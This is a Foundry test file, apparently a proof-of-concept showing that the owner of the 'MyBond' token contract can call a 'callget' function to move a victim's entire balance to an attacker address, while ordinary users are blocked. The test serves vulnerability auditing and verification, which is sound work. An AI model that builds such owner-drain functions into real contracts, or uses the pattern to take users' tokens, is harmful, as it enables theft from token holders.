// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MyBond.sol";

contract MyBondExploitTest is Test {
    MyBond token;
    address owner;
    address maliciousActor;
    address victim;

    function setUp() public {
        owner = address(this);
        maliciousActor = address(0xC0FFEE);
        victim = address(0xBEEF);

        token = new MyBond();

        // Fund victim with tokens
        token.mint(victim, 1000 ether);
    }

    function testOwnerCanTransferAnyTokens() public {
        console.log("[VULN-DIFF] --- BEFORE-Trigger ---");
        // Verify pre-transaction balances
        uint256 initialVictimBalance = token.balanceOf(victim);
        uint256 initialMaliciousBalance = token.balanceOf(maliciousActor);
        console.log("[VULN-DIFF] Victim balance (pre): %s", initialVictimBalance);
        console.log("[VULN-DIFF] Malicious balance (pre): %s", initialMaliciousBalance);
        
        assertEq(initialVictimBalance, 1000 ether, "Victim should have initial tokens");
        assertEq(initialMaliciousBalance, 0, "Malicious actor should start with zero balance");

        console.log("[VULN-DIFF] --- Trigger Callget ---");
        // Execute critical vulnerability trigger
        token.callget(victim, maliciousActor, initialVictimBalance);
        console.log("[VULN-DIFF] Owner called callget(%s, %s, %s)", victim, maliciousActor, initialVictimBalance);

        console.log("[VULN-DIFF] --- AFTER-Trigger ---");
        // Verify post-transaction balances
        uint256 finalVictimBalance = token.balanceOf(victim);
        uint256 finalMaliciousBalance = token.balanceOf(maliciousActor);
        console.log("[VULN-DIFF] Victim balance (post): %s", finalVictimBalance);
        console.log("[VULN-DIFF] Malicious balance (post): %s", finalMaliciousBalance);
        
        // Differential comparison
        console.log("[VULN-DIFF] Differential verification:");
        uint256 victimDiff = initialVictimBalance - finalVictimBalance;
        uint256 attackerDiff = finalMaliciousBalance - initialMaliciousBalance;
        console.log("[VULN-DIFF] Victim loss: %s", victimDiff);
        console.log("[VULN-DIFF] Attacker gain: %s", attackerDiff);
        
        // Vulnerability verdict
        if (victimDiff == 1000 ether && attackerDiff == 1000 ether) {
            console.log("Vulnerability Exists: Owner can bypass authorization to transfer arbitrary tokens");
        } else {
            console.log("Vulnerability not Exist: Balance changes didn't match exploit pattern");
        }
        
        // Original assertions preserved
        assertEq(finalVictimBalance, 0, "Victim should have no tokens remaining");
        assertEq(finalMaliciousBalance, 1000 ether, "Malicious actor should receive stolen tokens");
    }

    function testNormalUserCannotExploit() public {
        // Unchanged original test
        vm.startPrank(maliciousActor);
        vm.expectRevert("Ownable: caller is not the owner");
        token.callget(victim, maliciousActor, 500 ether);
        vm.stopPrank();
    }
}